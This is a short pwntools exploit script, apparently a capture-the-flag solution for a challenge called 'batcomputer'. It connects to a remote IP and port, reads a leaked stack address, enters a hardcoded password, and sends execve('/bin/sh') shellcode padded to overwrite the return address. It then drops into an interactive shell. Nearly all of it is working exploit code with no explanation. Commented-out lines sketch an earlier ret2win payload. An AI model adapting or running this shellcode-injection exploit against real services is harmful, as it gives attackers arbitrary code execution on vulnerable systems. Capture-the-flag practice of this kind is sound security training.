from pwn import *
import struct

# context.update(arch='i386', os='linux')
# elf = ELF('./batcomputer')

# p = elf.process()
p = remote("157.245.33.77", 31444)
# p = process('./vuln')
print(p.recvuntil(b"> "))
p.sendline(b"1")

leak = p.recvline()
leak = leak.strip(b"It was very hard, but Alfred managed to locate him: ").strip(b"\n")
# print(b"LEAK is : " + leak)

shellcode_addr = int(leak, 16)
print(p.recvuntil(b"> "))
p.sendline(b"2")
print(p.recvuntil(b"password: "))
p.sendline(b"b4tp@$$w0rd!")
print(p.recvuntil(b"commands: "))
# eip = p32(0x080491e2)
# junk = p32(0x90909090)
# param1 = p32(0xdeadbeef)
# param2 = p32(0xc0ded00d)

#payload = b'A'*188 + eip + junk + param1 + param2
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode += b"A"*(84-len(shellcode))
shellcode += p64(shellcode_addr)
p.sendline(shellcode)
print(p.recvuntil(b"> "))
p.sendline(b"3")
p.interactive()
#print(p.recvline())
